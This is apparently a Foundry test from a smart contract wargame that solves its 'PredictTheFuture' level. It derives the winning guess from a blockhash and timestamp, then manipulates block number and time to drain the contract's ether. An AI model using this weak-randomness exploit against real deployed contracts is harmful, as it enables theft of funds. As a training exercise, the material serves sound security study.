// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/06_PredictTheFuture/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    uint256 constant private BLOCK_NUMBER = 143242;
    uint256 constant private SOME_TIMESTAMP = 20;

    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(BLOCK_NUMBER);
    }

    function testExploitLevel() public {
        // Solution needs to be called from the block which is +2 from initial block or greater, i chose just +2
        // So in guess there will be BLOCK_NUMBER + 2 - 1 it is BLOCK_NUMBER + 1
        // and the timestamp which will be set to something which were guessed

        uint256 guess = uint256(keccak256(abi.encodePacked(blockhash(BLOCK_NUMBER + 1), SOME_TIMESTAMP))) % 10;
        instance.setGuess{value: 0.01 ether}(uint8(guess));

        vm.roll(BLOCK_NUMBER + 2);
        vm.warp(SOME_TIMESTAMP);
        instance.solution();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
